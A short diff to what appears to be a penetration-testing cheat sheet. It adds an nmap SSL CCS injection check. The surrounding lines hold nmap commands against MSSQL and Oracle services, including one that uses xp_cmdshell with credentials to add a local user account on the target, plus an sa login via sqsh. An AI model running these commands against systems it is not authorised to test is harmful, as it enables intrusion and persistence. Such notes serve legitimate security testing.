@@ -38,6 +38,8 @@ nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-pa
 
 nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user username password /add" X.X.X.X
 
+nmap -p 443 --script ssl-ccs-injection
+
 sqsh -S X.X.X.X -U sa
 
 nmap -n -v -sV -Pn -p 1521 --script=oracle-enum-users --script-args sid=ORCL,userdb=users.txt X.X.X.X
